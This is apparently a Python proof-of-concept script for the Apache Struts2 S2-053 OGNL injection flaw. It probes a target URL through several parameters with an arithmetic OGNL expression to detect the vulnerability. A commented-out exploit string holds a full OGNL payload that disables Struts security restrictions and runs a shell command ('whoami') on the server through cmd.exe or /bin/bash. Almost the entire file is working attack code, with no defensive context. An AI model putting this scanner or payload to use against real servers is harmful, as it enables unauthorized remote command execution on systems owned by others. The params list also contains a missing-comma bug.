import warnings
import requests
import random

warnings.filterwarnings("ignore")


def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    ran_number = '%25' + '%7b' + '%d-%d' % (ran_a, ran_b) + '%7d'
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    params = [
        "id",
        "name",
        "filename",
        "searchword"
        "username",
        "password",
        "stRegion"
    ]
    try:
        for param in params:
            vulnurl = url + "?" + param + "=" + ran_number
            req = requests.get(vulnurl, headers=headers, timeout=timeout, verify=False, )
            if str(ran_check) in req.text:
                result = "目标存在 Struts2-053, check url: %s" % url + '  ' + 'poc:' + param + "=" + ran_number
                return result

    except:
        pass

# test_url ='http://127.0.0.1:8080/struts2-showcase/integration/saveGangster.action'
# exp = r'''%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27whoami%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d'''